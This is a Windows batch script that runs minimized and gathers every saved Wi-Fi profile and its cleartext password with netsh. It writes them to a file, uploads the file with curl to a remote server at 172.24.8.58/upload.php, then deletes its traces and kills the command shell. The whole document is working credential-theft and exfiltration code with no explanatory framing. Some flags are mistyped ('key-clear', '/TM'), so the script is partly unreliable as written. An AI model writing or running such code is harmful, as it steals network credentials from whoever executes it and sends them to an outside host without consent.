@echo off
if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start
setlocal EnableDelayedExpansion

/rem "%~dpnxe" %* && exit

REM Retrieve all Wi-Fi profiles and store them in all_ssids.txt
(for /f "tokens=2* delims=: " %%i in ('netsh wlan show profiles ^| find "User Profile"') do (
    echo %%j >> all_ssids.txt
))

REM Iterate through each SSID, retrieve Wi-Fi password, and store SSID and password in wifi_passwords.txt
for /F "tokens=*" %%A in (all_ssids.txt) do (
    set "ssid=%%A"
    netsh wlan show profile name=!ssid! key-clear | findstr "Key" > key.txt
    set /p Send=<key.txt
    echo SSID: !ssid! >> wifi_passwords.txt
    echo Password: !Send! >> wifi_passwords.txt
    echo. >> wifi_passwords.txt
    del key.txt
)

REM Send wifi_passwords.txt to Apache server
curl -X POST -F "file=@wifi_passwords.txt" http://172.24.8.58/upload.php

REM Delete temporary files and terminate
del all_ssids.txt
del wifi_passwords.txt
Taskkill /TM cmd.exe /F
